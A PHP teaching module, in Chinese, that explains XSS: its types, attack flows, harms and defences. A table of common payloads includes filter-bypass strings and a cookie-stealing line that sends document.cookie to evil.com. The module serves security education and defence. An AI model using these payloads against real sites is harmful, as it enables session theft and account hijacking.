<?php
$module_name = 'XSS漏洞基础';
$module_icon = '📚';
$module_desc = '学习XSS跨站脚本漏洞的基本概念、类型、原理和防御方法。';

$content = <<<'EOT'
<div class="card">
    <div class="card-header">
        <h5 class="mb-0">📚 XSS漏洞基础</h5>
    </div>
    <div class="card-body">
        <div class="alert alert-info">
            <strong>💡 学习目标：</strong><br>
            理解XSS跨站脚本漏洞的基本概念、三种主要类型、攻击原理和防御方法。
        </div>

        <div class="card mb-3">
            <div class="card-header">
                <h6>💉 什么是XSS漏洞</h6>
            </div>
            <div class="card-body">
                <p><strong>XSS（Cross-Site Scripting，跨站脚本攻击）</strong>是一种Web安全漏洞，攻击者通过在网页中注入恶意脚本代码，当其他用户浏览该网页时，嵌入的恶意脚本会在用户浏览器中执行。</p>
                
                <div class="row mt-3">
                    <div class="col-md-6">
                        <div class="card bg-light h-100">
                            <div class="card-body">
                                <h6 class="card-title">🔍 核心原理</h6>
                                <p class="card-text">应用程序将用户输入的数据未经适当过滤就输出到页面中，导致恶意代码被浏览器解析执行。</p>
                            </div>
                        </div>
                    </div>
                    <div class="col-md-6">
                        <div class="card bg-light h-100">
                            <div class="card-body">
                                <h6 class="card-title">🎯 攻击目标</h6>
                                <ul class="mb-0">
                                    <li>窃取用户Cookie和会话信息</li>
                                    <li>劫持用户账户</li>
                                    <li>篡改网页内容</li>
                                    <li>发起钓鱼攻击</li>
                                </ul>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="card mb-3">
            <div class="card-header">
                <h6>📊 XSS攻击流程图</h6>
            </div>
            <div class="card-body">
                <div class="mermaid-container" style="background: #f8f9fa; padding: 20px; border-radius: 10px; margin: 20px 0;">
                    <pre class="mermaid">
flowchart TD
    A[攻击者] -->|构造恶意链接/输入| B[Web服务器]
    B -->|未过滤存储/返回| C[数据库/响应页面]
    C -->|包含恶意脚本| D[受害者浏览器]
    D -->|执行恶意脚本| E[窃取Cookie/劫持会话]
    E -->|发送数据| F[攻击者服务器]
    
    style A fill:#ff6b6b,stroke:#333,stroke-width:2px,color:#fff
    style E fill:#ff6b6b,stroke:#333,stroke-width:2px,color:#fff
    style F fill:#ff6b6b,stroke:#333,stroke-width:2px,color:#fff
                    </pre>
                </div>
            </div>
        </div>

        <div class="card mb-3">
            <div class="card-header">
                <h6>🏷️ XSS漏洞类型</h6>
            </div>
            <div class="card-body">
                <div class="accordion" id="xssTypes">
                    <div class="accordion-item">
                        <h2 class="accordion-header" id="heading1">
                            <button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#collapse1">
                                🔴 反射型XSS（Reflected XSS）
                            </button>
                        </h2>
                        <div id="collapse1" class="accordion-collapse collapse show" data-bs-parent="#xssTypes">
                            <div class="accordion-body">
                                <p>恶意脚本通过URL参数传入，服务器将其嵌入响应页面返回给用户执行。</p>
                                <div class="row">
                                    <div class="col-md-6">
                                        <div class="card bg-light">
                                            <div class="card-body">
                                                <h6>特点</h6>
                                                <ul class="mb-0">
                                                    <li>非持久化，一次性攻击</li>
                                                    <li>需要诱骗用户点击恶意链接</li>
                                                    <li>常用于钓鱼攻击</li>
                                                    <li>可通过URL直接观察</li>
                                                </ul>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="col-md-6">
                                        <div class="card bg-light">
                                            <div class="card-body">
                                                <h6>攻击示例</h6>
                                                <code>http://example.com/search?q=&lt;script&gt;alert('XSS')&lt;/script&gt;</code>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div class="mermaid-container" style="background: #fff; padding: 15px; border-radius: 10px; margin: 15px 0; border: 1px solid #ddd;">
                                    <pre class="mermaid">
sequenceDiagram
        participant A as 攻击者
        participant B as 受害者
        participant S as Web服务器
        
        A->>S: 构造恶意URL
        A->>B: 诱骗点击恶意链接
        B->>S: 请求恶意URL
        S->>B: 返回包含恶意脚本的页面
        B->>B: 执行恶意脚本
        B->>A: 发送Cookie到攻击者
                                    </pre>
                                </div>
                            </div>
                        </div>
                    </div>
                    
                    <div class="accordion-item">
                        <h2 class="accordion-header" id="heading2">
                            <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapse2">
                                🟠 存储型XSS（Stored XSS）
                            </button>
                        </h2>
                        <div id="collapse2" class="accordion-collapse collapse" data-bs-parent="#xssTypes">
                            <div class="accordion-body">
                                <p>恶意脚本被永久存储在目标服务器上（如数据库、文件系统），当用户浏览相关页面时自动执行。</p>
                                <div class="row">
                                    <div class="col-md-6">
                                        <div class="card bg-light">
                                            <div class="card-body">
                                                <h6>特点</h6>
                                                <ul class="mb-0">
                                                    <li>持久化存储，危害最大</li>
                                                    <li>无需诱骗用户点击</li>
                                                    <li>影响所有访问该页面的用户</li>
                                                    <li>常见于评论区、留言板</li>
                                                </ul>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="col-md-6">
                                        <div class="card bg-light">
                                            <div class="card-body">
                                                <h6>攻击场景</h6>
                                                <ul class="mb-0">
                                                    <li>论坛帖子/评论</li>
                                                    <li>用户个人资料</li>
                                                    <li>留言板/反馈表单</li>
                                                    <li>日志记录系统</li>
                                                </ul>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div class="mermaid-container" style="background: #fff; padding: 15px; border-radius: 10px; margin: 15px 0; border: 1px solid #ddd;">
                                    <pre class="mermaid">
sequenceDiagram
        participant A as 攻击者
        participant S as Web服务器
        participant D as 数据库
        participant B as 受害者
        
        A->>S: 提交含恶意脚本的评论
        S->>D: 存储恶意脚本
        B->>S: 浏览评论页面
        S->>D: 读取评论数据
        D->>S: 返回含恶意脚本的数据
        S->>B: 返回包含恶意脚本的页面
        B->>B: 执行恶意脚本
                                    </pre>
                                </div>
                            </div>
                        </div>
                    </div>
                    
                    <div class="accordion-item">
                        <h2 class="accordion-header" id="heading3">
                            <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapse3">
                                🟡 DOM型XSS（DOM-based XSS）
                            </button>
                        </h2>
                        <div id="collapse3" class="accordion-collapse collapse" data-bs-parent="#xssTypes">
                            <div class="accordion-body">
                                <p>攻击完全在浏览器端进行，通过修改页面的DOM环境来执行恶意脚本，不经过服务器处理。</p>
                                <div class="row">
                                    <div class="col-md-6">
                                        <div class="card bg-light">
                                            <div class="card-body">
                                                <h6>特点</h6>
                                                <ul class="mb-0">
                                                    <li>纯客户端攻击</li>
                                                    <li>不经过服务器</li>
                                                    <li>服务器日志无痕迹</li>
                                                    <li>难以检测和防御</li>
                                                </ul>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="col-md-6">
                                        <div class="card bg-light">
                                            <div class="card-body">
                                                <h6>常见触发点</h6>
                                                <ul class="mb-0">
                                                    <li>document.write()</li>
                                                    <li>innerHTML</li>
                                                    <li>eval()</li>
                                                    <li>location.hash</li>
                                                </ul>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div class="mermaid-container" style="background: #fff; padding: 15px; border-radius: 10px; margin: 15px 0; border: 1px solid #ddd;">
                                    <pre class="mermaid">
sequenceDiagram
        participant A as 攻击者
        participant B as 受害者浏览器
        
        A->>B: 构造恶意URL
        B->>B: 点击恶意链接
        B->>B: 读取location.hash
        B->>B: 动态写入DOM
        B->>B: 执行恶意脚本
                                    </pre>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="card mb-3">
            <div class="card-header">
                <h6>⚠️ XSS漏洞的危害</h6>
            </div>
            <div class="card-body">
                <div class="row">
                    <div class="col-md-4 mb-2">
                        <div class="card h-100 border-danger">
                            <div class="card-header bg-danger text-white">
                                <h6 class="mb-0">🔴 用户层面</h6>
                            </div>
                            <div class="card-body">
                                <ul class="mb-0">
                                    <li><strong>Cookie窃取：</strong>获取用户会话信息</li>
                                    <li><strong>账户劫持：</strong>冒充用户身份</li>
                                    <li><strong>钓鱼攻击：</strong>伪造登录表单</li>
                                    <li><strong>恶意操作：</strong>以用户身份执行操作</li>
                                </ul>
                            </div>
                        </div>
                    </div>
                    <div class="col-md-4 mb-2">
                        <div class="card h-100 border-warning">
                            <div class="card-header bg-warning text-dark">
                                <h6 class="mb-0">🟠 网站层面</h6>
                            </div>
                            <div class="card-body">
                                <ul class="mb-0">
                                    <li><strong>网站篡改：</strong>修改页面内容</li>
                                    <li><strong>声誉损失：</strong>用户信任度下降</li>
                                    <li><strong>恶意传播：</strong>利用网站传播恶意软件</li>
                                    <li><strong>SEO污染：</strong>植入垃圾链接</li>
                                </ul>
                            </div>
                        </div>
                    </div>
                    <div class="col-md-4 mb-2">
                        <div class="card h-100 border-info">
                            <div class="card-header bg-info text-white">
                                <h6 class="mb-0">🔵 高级攻击</h6>
                            </div>
                            <div class="card-body">
                                <ul class="mb-0">
                                    <li><strong>内网探测：</strong>扫描内网服务</li>
                                    <li><strong>键盘记录：</strong>记录用户输入</li>
                                    <li><strong>浏览器漏洞：</strong>利用浏览器漏洞</li>
                                    <li><strong>蠕虫传播：</strong>XSS蠕虫攻击</li>
                                </ul>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="card mb-3">
            <div class="card-header">
                <h6>🔧 常见XSS Payload</h6>
            </div>
            <div class="card-body">
                <div class="table-responsive">
                    <table class="table table-bordered table-hover">
                        <thead class="table-dark">
                            <tr>
                                <th>类型</th>
                                <th>Payload示例</th>
                                <th>说明</th>
                            </tr>
                        </thead>
                        <tbody>
                            <tr>
                                <td>基础弹窗</td>
                                <td><code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code></td>
                                <td>最简单的XSS测试</td>
                            </tr>
                            <tr>
                                <td>事件处理器</td>
                                <td><code>&lt;img src=x onerror=alert('XSS')&gt;</code></td>
                                <td>利用图片加载错误事件</td>
                            </tr>
                            <tr>
                                <td>SVG标签</td>
                                <td><code>&lt;svg onload=alert('XSS')&gt;</code></td>
                                <td>利用SVG加载事件</td>
                            </tr>
                            <tr>
                                <td>JavaScript伪协议</td>
                                <td><code>&lt;a href="javascript:alert('XSS')"&gt;click&lt;/a&gt;</code></td>
                                <td>利用链接执行JS</td>
                            </tr>
                            <tr>
                                <td>Cookie窃取</td>
                                <td><code>&lt;script&gt;new Image().src="http://evil.com/?c="+document.cookie&lt;/script&gt;</code></td>
                                <td>将Cookie发送到攻击者服务器</td>
                            </tr>
                            <tr>
                                <td>大小写混合</td>
                                <td><code>&lt;ScRiPt&gt;alert('XSS')&lt;/sCrIpT&gt;</code></td>
                                <td>绕过简单过滤</td>
                            </tr>
                            <tr>
                                <td>编码绕过</td>
                                <td><code>&lt;img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)&gt;</code></td>
                                <td>HTML实体编码绕过</td>
                            </tr>
                        </tbody>
                    </table>
                </div>
            </div>
        </div>

        <div class="card mb-3">
            <div class="card-header">
                <h6>🛡️ XSS防御方法</h6>
            </div>
            <div class="card-body">
                <div class="row">
                    <div class="col-md-6">
                        <div class="card h-100 border-success">
                            <div class="card-header bg-success text-white">
                                <h6 class="mb-0">✅ 核心防御措施</h6>
                            </div>
                            <div class="card-body">
                                <ul class="mb-0">
                                    <li><strong>输入过滤：</strong>对用户输入进行严格过滤</li>
                                    <li><strong>输出编码：</strong>根据上下文进行HTML/JS/URL编码</li>
                                    <li><strong>Content-Security-Policy：</strong>启用CSP策略</li>
                                    <li><strong>HttpOnly Cookie：</strong>防止JS读取敏感Cookie</li>
                                    <li><strong>X-XSS-Protection：</strong>启用浏览器XSS过滤器</li>
                                </ul>
                            </div>
                        </div>
                    </div>
                    <div class="col-md-6">
                        <div class="card h-100 border-info">
                            <div class="card-header bg-info text-white">
                                <h6 class="mb-0">🔵 辅助防御措施</h6>
                            </div>
                            <div class="card-body">
                                <ul class="mb-0">
                                    <li><strong>输入验证：</strong>白名单验证输入格式</li>
                                    <li><strong>长度限制：</strong>限制输入数据长度</li>
                                    <li><strong>安全框架：</strong>使用安全的模板引擎</li>
                                    <li><strong>定期审计：</strong>代码安全审计</li>
                                    <li><strong>安全培训：</strong>开发人员安全意识</li>
                                </ul>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="mermaid-container" style="background: #f8f9fa; padding: 20px; border-radius: 10px; margin: 20px 0;">
                    <pre class="mermaid">
flowchart TD
    A[用户输入] --> B{输入验证}
    B -->|验证失败| C[拒绝输入]
    B -->|验证通过| D[数据处理]
    D --> E{输出编码}
    E -->|HTML上下文| F[HTML实体编码]
    E -->|JS上下文| G[JavaScript编码]
    E -->|URL上下文| H[URL编码]
    E -->|CSS上下文| I[CSS编码]
    F --> J[安全输出]
    G --> J
    H --> J
    I --> J
    
    style B fill:#ffd43b,stroke:#333,stroke-width:2px
    style E fill:#ffd43b,stroke:#333,stroke-width:2px
    style J fill:#51cf66,stroke:#333,stroke-width:2px,color:#fff
    style C fill:#ff6b6b,stroke:#333,stroke-width:2px,color:#fff
                    </pre>
                </div>

                <div class="card bg-light mt-3">
                    <div class="card-body">
                        <h6>💡 输出编码示例</h6>
                        <pre class="mb-0"><code>// PHP htmlspecialchars() - HTML上下文
echo htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');

// JavaScript编码 - JS上下文
echo json_encode($user_input, JSON_HEX_TAG);

// URL编码 - URL上下文
echo urlencode($user_input);

// CSP Header设置
Content-Security-Policy: default-src 'self'; script-src 'self'

// HttpOnly Cookie设置
setcookie("session", $value, time()+3600, "/", "", true, true);</code></pre>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script src="../assets/js/mermaid.min.js"></script>
<script>
// 确保mermaid加载完成后再初始化
if (typeof mermaid !== 'undefined') {
    mermaid.initialize({
        startOnLoad: true,
        theme: 'default',
        flowchart: {
            useMaxWidth: true,
            htmlLabels: true,
            curve: 'basis'
        }
    });
}

// 监听折叠面板展开事件
document.addEventListener('DOMContentLoaded', function() {
    const accordionItems = document.querySelectorAll('.accordion-collapse');
    accordionItems.forEach(collapse => {
        collapse.addEventListener('shown.bs.collapse', function() {
            // 重新渲染mermaid
            if (typeof mermaid !== 'undefined') {
                mermaid.run();
            }
        });
    });
});
</script>
EOT;

include '../template/module_template.php';
?>
